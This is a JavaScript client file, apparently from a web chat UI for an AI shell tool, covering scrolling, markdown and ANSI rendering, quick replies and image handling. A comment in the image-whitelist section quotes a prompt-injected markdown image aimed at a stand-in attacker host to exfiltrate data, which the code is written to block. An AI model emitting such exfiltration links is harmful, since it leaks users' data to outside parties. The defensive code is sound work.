      trackViewportPan(); // frozen ≠ static: ride the browser's un-pan (see [TOUCH-FREEZE])
    }
    if (Date.now() - lastVvReport > 400) {
      lastVvReport = Date.now();
      reportViewport("vv-change"); // #8/#24 diagnostics at the moment it matters
    }
  };
  visualViewport.addEventListener("resize", onViewportChange);
  visualViewport.addEventListener("scroll", onViewportChange);
}
// [VV-SETTLE-END]

document.addEventListener("visibilitychange", () => {
  if (!document.hidden) snapViewportSoon(); // app-switcher restore can land in the short-window state
});

// The top arrow only appears while the user is actively scrolling up (and is
// far enough from the top for the jump to be worth a button); any downward
// movement — including streaming content auto-scrolling to the tail — hides it.
let lastScrollTop = 0;
let scrollingToTop = false; // the button's own smooth scroll must not re-show it
let scrollFadeTimer = null; // hides the visible arrow a beat after scrolling stops
// How long a jump arrow lingers after scrolling stops before it fades. Long
// enough to comfortably reach up and tap it, not so long it overstays (#134).
const SCROLL_FADE_MS = 2500;

function fadeScrollArrows() {
  $("scroll-down").hidden = true;
  $("scroll-top").hidden = true;
}

function updateScrollButton() {
  // Hide both arrows while the composer is focused or expanded tall (#115):
  // they sit right above the input and would overlap/obstruct it. They come
  // back once the composer is blurred AND back to its small inline state.
  if (document.activeElement === input || $("composer").classList.contains("tall")) {
    if (scrollFadeTimer) clearTimeout(scrollFadeTimer);
    $("scroll-down").hidden = true;
    $("scroll-top").hidden = true;
    return;
  }
  const top = messagesEl.scrollTop;
  const fromBottom = messagesEl.scrollHeight - top - messagesEl.clientHeight;
  const vh = messagesEl.clientHeight;
  // Jump-to-latest is directional like the top arrow: it appears while you
  // scroll DOWN and are still at least one viewport from the bottom, and hides
  // the moment you scroll UP or come within a viewport of the bottom — so it
  // fades out when you scroll up to read instead of lingering (#119, #127).
  if (top > lastScrollTop && fromBottom > vh) {
    $("scroll-down").hidden = false;
  } else if (top < lastScrollTop || fromBottom < vh) {
    $("scroll-down").hidden = true;
  }
  // Jump-to-top: appears while scrolling UP and at least one viewport from top.
  if (top < vh || top > lastScrollTop) scrollingToTop = false;
  if (top < lastScrollTop && top > vh && !scrollingToTop) {
    $("scroll-top").hidden = false;
  } else if (top > lastScrollTop || top < vh) {
    $("scroll-top").hidden = true;
  }
  lastScrollTop = top;
  // Auto-fade: once scrolling stops the arrow no longer reflects an active
  // gesture, so hide it after a short beat (#127). Every scroll event re-runs
  // this and rearms the timer, so an arrow stays put while you keep scrolling.
  if (scrollFadeTimer) clearTimeout(scrollFadeTimer);
  if (!$("scroll-down").hidden || !$("scroll-top").hidden) {
    scrollFadeTimer = setTimeout(fadeScrollArrows, SCROLL_FADE_MS);
  }
}

// [SCROLLPOS] Remembering the reading position walks the transcript's children,
// so it is debounced well clear of the scroll itself — the position that matters
// is where the scrolling STOPPED. pagehide/hidden catch a page torn down inside
// the debounce window, which on a phone is the common case (the reload after the
// app was put away is exactly that).
const SCROLL_POS_SAVE_MS = 300;
let scrollPosTimer = null;
messagesEl.addEventListener("scroll", () => {
  updateScrollButton();
  if (scrollPosTimer) clearTimeout(scrollPosTimer);
  scrollPosTimer = setTimeout(rememberScrollPos, SCROLL_POS_SAVE_MS);
}, { passive: true });
addEventListener("pagehide", rememberScrollPos);
document.addEventListener("visibilitychange", () => {
  if (document.hidden) rememberScrollPos(); // iOS PWAs hide far more reliably than they pagehide
});
// The composer's focus/blur listeners (arrows hide the instant it takes focus,
// #115) are attached in attachInputListeners together with keydown/input, since
// terminal mode swaps the #input node for a fresh one (#156) and every listener
// must move with it.

$("scroll-down").onclick = () => {
  messagesEl.scrollTo({ top: messagesEl.scrollHeight, behavior: "smooth" });
};

$("scroll-top").onclick = () => {
  $("scroll-top").hidden = true;
  scrollingToTop = true;
  messagesEl.scrollTo({ top: 0, behavior: "smooth" });
};

function onHistory(history) {
  // The legacy flat-transcript replay (a log too old to reconstruct) paints a
  // whole conversation, so it ends the live turn for the same reason a replay
  // does — via the owner, not by zeroing its own corner of the cluster.
  resetLiveTurn("rebuild");
  let prevPrompt = "";
  for (const message of history) {
    const content = (message.content || "").trim();
    if (!content) continue;
    if (message.role === "user") {
      retireQuickReplies();
      prevPrompt = stripAttachmentNotes(content);
      addUserMsg(content);
    }
    else if (message.role === "assistant") {
      const el = addMsg("answer md", "");
      el.replaceChildren(renderMarkdown(content));
      highlightFences(el);
      attachAnswerTools(el, content, prevPrompt);
    } else {
      const lines = content.split("\n");
      const shown = lines.slice(0, 4).join("\n");
      addMsg("echo", lines.length > 4 ? `${shown}\n… (${lines.length - 4} more lines)` : shown);
    }
  }
  scrollToEnd(true);
}

// ---- ANSI SGR rendering --------------------------------------------------
function ansiFragment(text) {
  // man/groff render bold as `X\bX` and underline as `_\bX` (backspace
  // overstrike). Convert to real bold/underline — SGR the parser below already
  // understands — so they show as emphasis AND copy cleanly; left as-is the \b
  // renders as a tofu box between every character and poisons the copied text.
  text = text
    .replace(/_\x08([^\n\x08])/g, "\x1b[4m$1\x1b[24m")   // underline: _\bX
    .replace(/([^\n\x08])\x08\1/g, "\x1b[1m$1\x1b[22m")  // bold: X\bX
    .replace(/.?\x08/g, "");                             // strip any leftover overstrike
  // OSC sequences (titles, hyperlinks) carry no visible text formatting.
  text = text.replace(/\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)/g, "");
  const frag = document.createDocumentFragment();
  const classes = new Set();
  const re = /\x1b\[([0-9;]*)m|\x1b\[[0-9;?]*[A-Za-z]|\x1b[()][A-Z0-9]|\r/g;
  let last = 0;
  let match;
  const push = (chunk) => {
    if (!chunk) return;
    if (classes.size) {
      const span = document.createElement("span");
      span.className = [...classes].join(" ");
      span.textContent = chunk;
      frag.appendChild(span);
    } else {
      frag.appendChild(document.createTextNode(chunk));
    }
  };
  while ((match = re.exec(text))) {
    push(text.slice(last, match.index));
    last = re.lastIndex;
    if (match[1] !== undefined) applySgr(match[1], classes);
  }
  push(text.slice(last));
  return frag;
}

function applySgr(params, classes) {
  const dropColor = (prefix) => {
    for (const cls of [...classes]) if (cls.startsWith(prefix)) classes.delete(cls);
  };
  const codes = params === "" ? [0] : params.split(";").map(Number);
  for (let i = 0; i < codes.length; i++) {
    const code = codes[i];
    if (code === 0) classes.clear();
    else if (code === 1) classes.add("a-b");
    else if (code === 2) classes.add("a-dim");
    else if (code === 3) classes.add("a-i");
    else if (code === 4) classes.add("a-u");
    else if (code === 22) { classes.delete("a-b"); classes.delete("a-dim"); }
    else if (code === 23) classes.delete("a-i");
    else if (code === 24) classes.delete("a-u");
    else if ((code >= 30 && code <= 37) || (code >= 90 && code <= 97)) {
      dropColor("a-fg");
      classes.add(`a-fg${code}`);
    } else if (code === 39) dropColor("a-fg");
    else if (code === 38 || code === 48) {
      // 256/truecolor: skip params, render unstyled rather than wrong.
      if (codes[i + 1] === 5) i += 2;
      else if (codes[i + 1] === 2) i += 4;
      if (code === 38) dropColor("a-fg");
    }
  }
}

// The global console (#148) renders through a real terminal emulator —
// vendored xterm.js (static/vendor/xterm.js, a plain global like highlight.js).
// Full cursor-addressing/erase/scroll support is what makes an interactive
// shell (zsh line-editor redraw, autosuggestions), gcloud auth, and simple TUIs
// render correctly — the old hand-rolled line model could not (#148 follow-up).
// The controller lives further down; see openConsole().

// ---- syntax highlighting (fenced code blocks) -----------------------------
// hljs is vendor/highlight.min.js (static/vendor, no CDN) — a plain global,
// loaded before this script. renderMarkdown() only stamps a fence's language
// onto data-lang; highlighting itself runs here, called just at the points
// an answer is fully settled (closeAnswer, onDone's unstreamed branch,
// onHistory's replay), never per streamed token — re-tokenizing a growing
// fence on every frame would be wasted work and would flicker mid-stream.
function highlightFences(container) {
  if (!window.hljs) return; // vendor script missing/blocked — fences stay plain
  for (const code of container.querySelectorAll("pre > code[data-lang]")) {
    if (code.classList.contains("hljs")) continue; // idempotent if called twice
    const lang = code.dataset.lang;
    if (!hljs.getLanguage(lang)) continue; // unknown language name — no auto-detect fallback
    // hljs.highlight() HTML-escapes the source before wrapping tokens in
    // spans, so this is the one sink allowed to use innerHTML: the text it
    // reads is what we already put in the DOM via textContent (never model
    // markup), and hljs's own escaping is what reaches the DOM, not the
    // model's raw string.
    code.innerHTML = hljs.highlight(code.textContent, { language: lang }).value;
    code.classList.add("hljs");
  }
}

// Syntax-highlight a proposed shell command (bash grammar) in an approval card
// so operators (&&, |, ||), flags, strings, and binaries stand out (#90). Same
// vendored hljs and the same innerHTML-safety as highlightFences: hljs escapes
// the source it's given, and the source is text we set via textContent, so
// code.textContent still returns the exact command for approve/copy.
function highlightCommand(code) {
  if (!window.hljs || !hljs.getLanguage("bash")) return; // vendor missing — stays plain
  code.innerHTML = hljs.highlight(code.textContent, { language: "bash" }).value;
  code.classList.add("hljs");
}

// ---- markdown rendering --------------------------------------------------
// `scope` (optional) is the caller's per-ANSWER set of videos already rendered
// as a card — see [ONE-CARD]. Nested renders (list items, blockquotes) pass
// none and inherit the enclosing scope, or a card inside a list item would be
// blind to the one beside it; a top-level render with no scope gets its own.
function renderMarkdown(text, scope) {
  const enclosing = cardScope;
  cardScope = scope instanceof Set ? scope : cardScope || new Set();
  try {
    return renderMarkdownBlocks(text);
  } finally {
    cardScope = enclosing;
  }
}

function renderMarkdownBlocks(text) {
  const frag = document.createDocumentFragment();
  // Normalize CRLF/lone-CR up front (#80): a trailing \r riding along on every
  // split line is otherwise harmless noise almost everywhere, but it can land
  // inside an inline match's captured text (e.g. a quick-reply payload) since
  // most of the inline regexes below don't exclude it explicitly.
  const lines = text.replace(/\r\n?/g, "\n").split("\n");
  let i = 0;
  let paragraph = [];

  const flush = () => {
    if (!paragraph.length) return;
    const p = document.createElement("p");
    p.appendChild(inlineMd(paragraph.join("\n")));
    frag.appendChild(p);
    paragraph = [];
  };

  while (i < lines.length) {
    const line = lines[i];
    const fence = fenceOpen(line);
    if (fence) {
      flush();
      const body = [];
      i++;
      while (i < lines.length && !fenceCloses(lines[i], fence)) body.push(dedent(lines[i++], fence.indent));
      i++; // closing fence (or EOF while streaming)
      // A ```aish-issue block (#110) is a feedback draft, not code: render it as
      // a review card with Create/Edit controls instead of a raw code block.
      if (fence.lang === "aish-issue") {
        frag.appendChild(issueDraftCard(body.join("\n")));
        continue;
      }
      const pre = document.createElement("pre");
      const code = document.createElement("code");
      if (fence.lang) code.dataset.lang = fence.lang;
      code.textContent = body.join("\n");
      pre.appendChild(code);
      const holder = document.createElement("div");
      holder.className = "copywrap";
      const wrapBtn = document.createElement("button");
      wrapBtn.type = "button";
      wrapBtn.className = "code-wrap";
      wrapBtn.title = "Wrap lines";
      wrapBtn.innerHTML = WRAP_SVG;
      wrapBtn.onclick = () => holder.classList.toggle("wrap-on");
      holder.append(wrapBtn, copyChip(() => code.textContent, "copy code"), pre);
      frag.appendChild(holder);
      continue;
    }
    // [RULE-VERDICT-START]
    // aish's OWN verdict on the answer, not a paragraph of it.
    //
    // When a rule fails, the harness goads the model to fix its answer a bounded
    // number of times and then delivers it anyway rather than wedging the turn —
    // carrying a line the harness writes saying what was not followed. That line
    // is the point: a rule that was tried and failed has to be visible to the
    // owner and not only to automation.
    //
    // It arrived in the same font, the same colour and the same paragraph flow as
    // the answer, so it read as though the model had said it — an accusation in
    // the voice of the accused. Everything else aish says in its own voice is
    // marked and rendered as a system row; this one spells the marker `[aish]`
    // rather than `[aish:` and so matched nothing.
    //
    // Parsed HERE rather than sent as its own event, for the reason the
    // attachment notes record: the prose is not a display string that leaked, it
    // IS the record. It goes into the session log and into the model
    // conversation, so a structured field would describe only turns logged after
    // today and this parser would still be needed for every older one.
    const verdict = line.match(/^\[aish\]\s+(.*)$/);
    if (verdict) {
      flush();
      const row = document.createElement("div");
      row.className = "rule-verdict";
      row.appendChild(inlineMd(verdict[1]));
      frag.appendChild(row);
      i++;
      continue;
    }
    // [RULE-VERDICT-END]
    const heading = line.match(/^ {0,3}(#{1,6})\s+(.*)$/);
    if (heading) {
      flush();
      const h = document.createElement("h" + Math.min(heading[1].length + 1, 6));
      h.className = "md-h";
      h.appendChild(inlineMd(heading[2]));
      frag.appendChild(h);
      i++;
      continue;
    }
    if (/^(\s*)(?:[-*+]|\d+[.)])\s+/.test(line)) {
      flush();
      const opener = line.match(/^(\s*)(?:[-*+]|(\d+)[.)])\s+/);
      const baseIndent = opener[1].length;
      const ordered = opener[2] !== undefined;
      const list = document.createElement(ordered ? "ol" : "ul");
      // An ordered list that doesn't start at 1 keeps its true first number via
      // the start attribute, so a fragment picking up after a nested block never
      // silently renumbers from 1 (#166).
      if (ordered && parseInt(opener[2], 10) !== 1) list.setAttribute("start", opener[2]);
      const leadOf = (s) => s.match(/^\s*/)[0].length;
      while (i < lines.length) {
        const itemLine = lines[i];
        const m = itemLine.match(/^(\s*)(?:[-*+]|\d+[.)])(\s+)(.*)$/);
        if (!m || m[1].length !== baseIndent) break; // not an item at this level
        const contentCol = itemLine.length - m[3].length; // column the text starts at
        const parts = [m[3]];
        i++;
        // Absorb the item's continuation — blank lines plus lines indented under
        // the marker (a nested paragraph, code block, or sub-list) — instead of
        // breaking out of the list and restarting numbering (#166). Blank lines
        // are buffered and kept only when more indented content follows them.
        let pending = [];
        while (i < lines.length) {
          const cont = lines[i];
          if (cont.trim() === "") { pending.push(""); i++; continue; }
          if (leadOf(cont) <= baseIndent) break; // a sibling item or dedented text ends it
          parts.push(...pending, cont.slice(Math.min(contentCol, leadOf(cont))));
          pending = [];
          i++;
        }
        const li = document.createElement("li");
        if (parts.length === 1) {
          li.appendChild(inlineMd(parts[0])); // flat item — identical to before
        } else {
          li.appendChild(renderMarkdown(parts.join("\n"))); // nested blocks under the item
        }
        list.appendChild(li);
      }
      frag.appendChild(list);
      continue;
    }
    if (/^ {0,3}\|.*\|\s*$/.test(line) && i + 1 < lines.length
        && /^ {0,3}\|[\s:|-]+\|\s*$/.test(lines[i + 1])) {
      flush();
      frag.appendChild(mdTable(lines, i));
      i += 2;
      while (i < lines.length && /^ {0,3}\|.*\|\s*$/.test(lines[i])) i++;
      continue;
    }
    if (/^\s*(---+|\*\*\*+)\s*$/.test(line)) {
      flush();
      frag.appendChild(document.createElement("hr"));
      i++;
      continue;
    }
    if (/^ {0,3}>\s?/.test(line)) {
      flush();
      const quote = document.createElement("blockquote");
      const body = [];
      while (i < lines.length && /^ {0,3}>\s?/.test(lines[i])) {
        body.push(lines[i].replace(/^ {0,3}>\s?/, ""));
        i++;
      }
      quote.appendChild(renderMarkdown(body.join("\n")));
      frag.appendChild(quote);
      continue;
    }
    if (line.trim() === "") {
      flush();
      i++;
      continue;
    }
    paragraph.push(line);
    i++;
  }
  flush();
  return frag;
}

function mdTable(lines, start) {
  const splitRow = (row) =>
    row.trim().replace(/^\||\|$/g, "").split("|").map((cell) => cell.trim());
  const wrap = document.createElement("div");
  wrap.className = "md-table";
  const table = document.createElement("table");
  const thead = document.createElement("thead");
  const headRow = document.createElement("tr");
  for (const cell of splitRow(lines[start])) {
    const th = document.createElement("th");
    th.appendChild(inlineMd(cell));
    headRow.appendChild(th);
  }
  thead.appendChild(headRow);
  table.appendChild(thead);
  const tbody = document.createElement("tbody");
  const sourceRows = [lines[start], lines[start + 1]];
  for (let row = start + 2; row < lines.length && /^ {0,3}\|.*\|\s*$/.test(lines[row]); row++) {
    sourceRows.push(lines[row]);
    const tr = document.createElement("tr");
    for (const cell of splitRow(lines[row])) {
      const td = document.createElement("td");
      td.appendChild(inlineMd(cell));
      tr.appendChild(td);
    }
    tbody.appendChild(tr);
  }
  table.appendChild(tbody);
  wrap.appendChild(table);
  // Copy hands back the markdown source, so the table pastes as a table
  // anywhere markdown is understood — the chip lives outside the scroll box.
  const source = sourceRows.join("\n");
  const holder = document.createElement("div");
  holder.className = "copywrap";
  holder.append(copyChip(() => source, "copy table"), wrap);
  return holder;
}

// Link/chip/image labels and the quick-reply payload exclude "\n" (#80): a
// paragraph merges several source lines with no blank between them (e.g.
// consecutive quick-reply lines with no separator), and without the
// exclusion an unmatched "[" earlier in that blob could greedily consume
// across a line break into a LATER line's real chip syntax instead of
// leaving it to match on its own.
const INLINE_RE = new RegExp(
  "(`[^`]+`)" +
  "|(\\*\\*[^*]+\\*\\*|__[^_]+__)" +
  "|(\\*[^*\\s][^*]*\\*)" +
  "|(~~[^~]+~~)" +
  "|\\[([^\\]\\n]+)\\]\\((https?:\\/\\/[^)\\s]+)\\)" +
  "|\\[([^\\]\\n]+)\\]\\(aish-reply:\\/\\/([^)\\n]*)\\)" +
  "|!\\[([^\\]\\n]*)\\]\\(([^)\\s]+)\\)" +
  // A link to a file on THIS machine — last, so http, aish-reply and images
  // are all read as themselves first, and appended rather than inserted so no
  // existing branch's group number moves. Spaces are allowed inside the
  // parentheses on purpose: the site names the file, and "faktura 09-2026.pdf"
  // is what a real invoice is called.
  //
  // `file://` is accepted and thrown away. aish never writes it — the tool
  // hands the model the exact line — but a model reaching for "a link to a file
  // on your machine" reaches for `file://` on its own, and did: seven invoices
  // in one real answer, every one of them inert, because a page cannot link to
  // the filesystem. A chat log is never rewritten, so that answer has to keep
  // rendering for as long as the chat exists — and now it renders as the files.
  "|\\[([^\\]\\n]+)\\]\\((?:file:\\/\\/)?(\\/[^)\\n]+)\\)"
);

// Every external http(s) link the transcript renders opens in the user's real
// browser, not an in-app webview (#165): target=_blank hands the URL to the OS,
// and rel="noopener noreferrer" severs the opener/referrer channel. Routing all
// transcript anchors through this one helper keeps the invariant structural.
// The in-app aish-*:// schemes (quick replies) render as buttons, never anchors,
// so they keep their own click handling and are never given target=_blank.
function externalAnchor(href) {
  const a = document.createElement("a");
  a.href = href;
  a.target = "_blank";
  a.rel = "noopener noreferrer";
  return a;
}

// [INLINEIMG-START]
// Remote-image fetch whitelist — keep in lockstep with CSP_IMG_HOSTS in
// server.py (content_security_policy). The CSP header already blocks other
// hosts at the browser layer, but only on pages served with the header;
// enforcing the same policy here makes it hold on EVERY render path
// (streaming, replay, offline replay, export preview) and degrade to a
// graceful non-embedded link instead of a CSP violation (#178 P1-12). A
// prompt-injected ![](https://attacker/x.png?<exfil>) must never fire a
// zero-click GET at render time.
const IMG_FETCH_HOSTS = ["img.youtube.com", "i.ytimg.com", "maps.googleapis.com"];

// Pure decision: may this <img src> be set (= fetched) at render time?
// data: carries its own bytes and same-origin paths (/file?…) stay on our
// server; a remote host must be on the whitelist. Unparseable → no fetch.
function imageFetchAllowed(src) {
  if (src.startsWith("data:")) return true;
  if (!/^https?:\/\//i.test(src)) return true;
  try {
    return IMG_FETCH_HOSTS.includes(new URL(src).hostname.toLowerCase());
  } catch {
    return false;
  }
}
// [INLINEIMG-END]

// [RENDERERR-START]
// The browser is the only place that knows an image did not render, and until
// #188 it kept that to itself: the fallback below wrote a small "unavailable"
// note into the DOM and told nobody, so the model's only feedback channel was
// the user typing "images don't show". These failures are reported back — logged
// as a trace step, and (for a live turn) handed to the model as a note on its
// next one, so it retries a different source instead of re-pasting a dead link.
//
// Debounced and batched: one answer with four broken pictures is ONE report and
// one note, not four. What is reported is the ORIGINAL target the model wrote,
// never the rewritten /file?…&token= URL — that would put the access token in
// the session log. Nothing is queued when the socket is down: a diagnostic that
// arrives after the conversation moved on is worse than none.
//
// LIVE ONLY (#201). A failure to render is a fact about the turn that WROTE the
// image, and that is the only turn anyone can act on it in: the model is handed
// the note solely on a live failure, so a replayed one was never anything but
// ledger noise. Reporting it on every render made it noise that compounded —
// re-reading an old chat re-reported the same dead links, each report appending
// to the log, which then read as fresh activity and marked the chat unread. One
// chat had accumulated 53 identical records, up to four per open, and could not
// be marked read by any amount of reading. A property of the transcript is not
// an event; only its arrival was.
const RENDER_ERROR_DEBOUNCE_MS = 1200;
const RENDER_ERROR_BATCH_MAX = 6;
const renderErrorBuffer = new Set(); // original targets awaiting one batched report
let renderErrorTimer = null;

// The `live` gate is HERE rather than at each call site so no future one can
// forget it — every path into a render failure funnels through this function.
function noteRenderError(target, live) {
  // The offline mirror legitimately serves transcripts whose images were never
  // synced; reporting that would blame the model for the network.
  if (offlineViewing) return;
  if (!live) return; // a replay re-reports what the live turn already said (#201)
  if (renderErrorBuffer.size >= RENDER_ERROR_BATCH_MAX && !renderErrorBuffer.has(target)) return;
  renderErrorBuffer.add(target);
  if (renderErrorTimer) clearTimeout(renderErrorTimer);
  renderErrorTimer = setTimeout(flushRenderErrors, RENDER_ERROR_DEBOUNCE_MS);
}

function flushRenderErrors() {
  renderErrorTimer = null;
  const items = [...renderErrorBuffer];
  renderErrorBuffer.clear();
  if (!items.length) return;
  if (!ws || ws.readyState !== WebSocket.OPEN) return;
  // `live` stays on the wire — the server reads it to decide whether the model
  // gets a note — but nothing unlive reaches here any more.
  ws.send(JSON.stringify({ type: "render_error", what: "image", items, live: true }));
}
// [RENDERERR-END]

// Images (#9): ![alt](https://…) embeds a whitelisted web image (see
// IMG_FETCH_HOSTS above — any other remote host renders as a link, never a
// fetch); ![alt](/abs/path.png) is rewritten to the token-gated /file
// endpoint, which only serves image files inside the active session's
// roots. Any other scheme stays as the literal text. Tap opens the
// full-size image in a new tab.
// The src a markdown image target may actually be loaded from, or null when
// policy forbids it. Factored out of inlineImage so an embed POSTER resolves
// through the identical rules — a poster that skipped the whitelist would be
// the same zero-click fetch this policy exists to close.
function imageSrc(target) {
  if (/^https?:\/\//.test(target)) {
    return imageFetchAllowed(target) ? target : null;
  }
  if (target.startsWith("/")) {
    const params = new URLSearchParams({ path: target });
    if (token) params.set("token", token);
    return `/file?${params}`;
  }
  return null;
}

// A picture of a page aish drove, which has its own endpoint because it has its
// own store (#318). The bytes left the workspace boundary so the MODEL could no
// longer name one to `show_image` and read a hostile page into its own context;
// `/file` is scoped to that boundary and therefore cannot serve one any more.
// Same token, same absolute-path rule, a different door — and the door is the
// only difference, because what a frame is FOR is being looked at.
function frameSrc(target) {
  if (typeof target !== "string" || !target.startsWith("/")) return null;
  const params = new URLSearchParams({ path: target });
  if (token) params.set("token", token);
  return `/frame?${params}`;
}

// The <img> itself, with the broken-file handling every image render shares.
// `onBroken` lets the caller decide what a failure looks like in its own layout.
function markdownImg(alt, src, target, live, onBroken) {
  const img = document.createElement("img");
  img.className = "md-img";
  img.loading = "lazy";
  img.alt = alt || target;
  // A missing file (deleted since, or another session's roots) renders as a
  // small broken-image note instead of the browser's default glyph.
  img.onerror = () => {
    onBroken();
    noteRenderError(target, live);
  };
  img.src = src;
  return img;
}

function inlineImage(alt, target) {
  // Whether this render is the live turn, captured now: onerror fires later, by
  // which time `replaying` says nothing about where this image came from.
  const live = !replaying && !offlineViewing;
  const src = imageSrc(target);
  if (src === null) {
    if (!/^https?:\/\//.test(target)) {
      return document.createTextNode(`![${alt}](${target})`);
    }
    // Same visual as the broken-image note; the anchor keeps the URL
    // reachable by an explicit user tap — only the zero-click fetch is out.
    // Reported on the LIVE turn (#188/#201): a hand-written remote image link
    // means the model skipped show_image, and that turn is the only one that
    // can still act on it. Re-reporting it on every later read of the chat
    // taught nobody and marked the chat unread — see [RENDERERR].
    noteRenderError(target, live);
    const broken = externalAnchor(target);
    broken.className = "img-link img-broken";
    broken.textContent = `🖼 ${alt || target} (not embedded)`;
    return broken;
  }
  // A LOCAL image (rewritten to /file) previews in place: opening a new tab to
  // look at a chart aish just drew means leaving an installed PWA for Safari.
  // A REMOTE one keeps its anchor — reaching the real URL by an explicit tap is
  // exactly what that link is for.
  const local = !/^https?:\/\//.test(target);
  const link = local ? document.createElement("span") : externalAnchor(src);
  link.className = "img-link";
  if (local) {
    // Passed as a one-item group so the picture carries the FILE it came from:
    // a chart aish drew is as savable as a photo you sent it ([ATTACH-SAVE]).
    const name = alt || target.split("/").pop();
    link.onclick = () => openPreview(src, name, [{ src, name, file: target }], 0);
  }
  link.appendChild(
    markdownImg(alt, src, target, live, () => {
      link.textContent = `🖼 ${alt || target} (unavailable)`;
      link.classList.add("img-broken");
    })
  );
  return link;
}

// Quick replies (#17): [Label](aish-reply://answer text) links render as
// tap chips; tapping feeds the answer into the composer (like tapping an
// old prompt bubble) so the user can edit or just hit send — the sent text
// then shows as a normal user message. The scheme is intercepted here — it
// never navigates and needs no JSON output or schema support from the
// model, so small local models can use it too.
function quickReplyChip(label, payload) {
  const btn = document.createElement("button");
  btn.type = "button";
  btn.className = "quick-reply";
  // Trim stray whitespace/\r (#80): INLINE_RE's label group isn't whitespace-
  // aware, so a chip built from a source line with trailing \r (or the model
  // just leaving a space before "]") would otherwise carry it into the button.
  label = (label || "").trim();
  btn.textContent = label;
  let reply = (payload || "").trim();
  try { reply = decodeURIComponent(reply) || reply; } catch { /* keep raw */ }
  if (!reply) reply = label;
  // #116: a tapped chip submits immediately for a fast one-tap reply — UNLESS
  // its payload is meant to be completed by the user first (it ends with ':' or
  // trailing whitespace, e.g. the feedback "Edit" chip "…change the draft: "),
  // in which case it just seeds the composer and waits for you to finish typing.
  const seedOnly = /[\s:]$/.test(payload || "");
  btn.onclick = () => {
    if (input.value.trim() && input.value.trim() !== reply) {
      showToast("clear the input first to use a quick reply");
      return;
    }
    input.value = reply;
    input.setSelectionRange(reply.length, reply.length);
    resizeInput();
    if (seedOnly) {
      input.focus(); // let the user complete the sentence before sending
    } else {
      submitInput({ fromChip: true }); // one-tap send — as a message, never a command
    }
  };
  return btn;
}

// Chips are one-shot: once ANY user reply goes out — a fed chip or a typed
// answer — every chip still on screen disappears. Paragraphs that held
// nothing but chips collapse with them.
function retireQuickReplies() {
  for (const btn of messagesEl.querySelectorAll(".quick-reply:not(.spent)")) {
    btn.classList.add("spent");
    const p = btn.parentElement;
    const emptied = p?.tagName === "P" && [...p.childNodes].every((node) =>
      node.nodeType === Node.TEXT_NODE
        ? !node.textContent.trim()
        : node.classList?.contains("spent"));
    if (emptied) p.classList.add("spent");
  }
}

// Issue-draft card (#110): a ```aish-issue block is the finished feedback issue
// — the ONE thing the user reviews and the EXACT text the backend files. Parse
// it (mirror of server.py parse_issue_block: line 1 `title:`, optional `---`
// separator, the rest is the body verbatim) and render a review card: bold
// title, the body as markdown, then Create / Edit controls. "Create the issue"
// sends {type:create_issue} — the backend files the stashed draft as the user's
// own action (no model, no approval gate, repo pinned). "Edit" is an ordinary
// quick reply that seeds the composer so the user tells the model what to change.
function issueDraftCard(inner) {
  const lines = inner.replace(/\r\n?/g, "\n").split("\n");
  const first = (lines[0] || "").trim();
  const title = /^title:/i.test(first) ? first.slice(first.indexOf(":") + 1).trim() : first;
  let rest = lines.slice(1);
  if (rest.length && rest[0].trim() === "---") rest = rest.slice(1); // optional separator
  const body = rest.join("\n").trim();

  const card = document.createElement("div");
  card.className = "issue-draft";
  const head = document.createElement("div");
  head.className = "issue-draft-title";
  head.textContent = title;
  card.appendChild(head);
  const bodyEl = document.createElement("div");
  bodyEl.className = "issue-draft-body md";
  bodyEl.appendChild(renderMarkdown(body));
  card.appendChild(bodyEl);

  const controls = document.createElement("div");
  controls.className = "issue-draft-controls";
  const createBtn = document.createElement("button");
  createBtn.type = "button";
  createBtn.className = "issue-draft-create";
  createBtn.textContent = "Create the issue";
  createBtn.onclick = () => {
    if (createBtn.disabled) return;
    if (act({ type: "create_issue" }, {
      label: "filing that issue",
      lost: () => controls.classList.remove("spent"), // it can fire again — it never fired
    })) {
      controls.classList.add("spent"); // one-shot: a filed draft can't refire
    }
  };
  controls.appendChild(createBtn);
  // Edit reuses the quick-reply chip so it behaves exactly like today's edit
  // chip — it seeds the composer, the user says what to change, the model
  // re-drafts a fresh aish-issue block.
  controls.appendChild(quickReplyChip("Edit", "I'd like to change the draft: "));
  card.appendChild(controls);
  return card;
}

// Rich embeds (#50): whitelisted YouTube / Google Maps links become inline
// cards in the WEB transcript only — the CLI keeps plain markdown links.
// Security: only strictly-matched ids/queries ever reach an iframe src, and
// the value is decoded then re-encoded with encodeURIComponent, so raw
// model/page text is never interpolated into a frame URL. Frames are
// sandboxed, given no referrer, and share no origin with aish.
const YOUTUBE_RE =
  /^https?:\/\/(?:www\.)?(?:youtube\.com\/(?:watch\?(?:[^#]*&)?v=|shorts\/)([a-zA-Z0-9_-]{11})|youtu\.be\/([a-zA-Z0-9_-]{11}))(?:[#&?/]|$)/;
// The path segment after /maps varies by link type (bare, /search/, /dir/,
// /place/…) — (?:\/[^?#\s]*)? absorbs any of it so the query string (the part
// that actually gets parsed below) is still reached.
const MAPS_RE =
  /^https?:\/\/(?:maps\.google\.com\/maps|(?:www\.)?google\.[a-z.]+\/maps)(?:\/[^?#\s]*)?\?([^#\s]+)/;

const YT_PLAY_SVG =
  '<svg viewBox="0 0 68 48" aria-hidden="true"><path class="yt-btn" d="M66.52 7.74a8 8 0 0 0-5.63-5.66C55.94 1 34 1 34 1S12.06 1 7.11 2.08A8 8 0 0 0 1.48 7.74 83.7 83.7 0 0 0 .5 24a83.7 83.7 0 0 0 .98 16.26 8 8 0 0 0 5.63 5.66C12.06 47 34 47 34 47s21.94 0 26.89-1.08a8 8 0 0 0 5.63-5.66A83.7 83.7 0 0 0 67.5 24a83.7 83.7 0 0 0-.98-16.26z"/><path class="yt-arrow" d="M27 34l18-10-18-10z"/></svg>';

// [ONE-CARD-START]
// One card per video per answer. A turn about a video routinely produces the
// still AND a link to it — `show_image` on the thumbnail, then "here is a
// summary of [the video](…)" in the prose — and each of those used to become
// its own card, so the answer opened with the same picture twice, once with a
// play button on it (the state of the transcript in issue #217).
//
// The FIRST occurrence wins and every later one degrades to a plain hyperlink,
// so a duplicate costs a link and never a second copy of the picture. Order is
// the model's: the composed poster line (`_show_image` hands one back for a
// video thumbnail) normally leads the answer, which is why it is the one that
// becomes the card.
//
// The scope is the ANSWER, not the render call, and the two are different while
// a turn streams: `renderAnswerNow` re-renders the live tail on every token and
// freezes a growing prefix, so the set is owned by the caller — the prefix
// commits into it, the tail is handed a throwaway copy (`renderMarkdown`).
let cardScope = null;

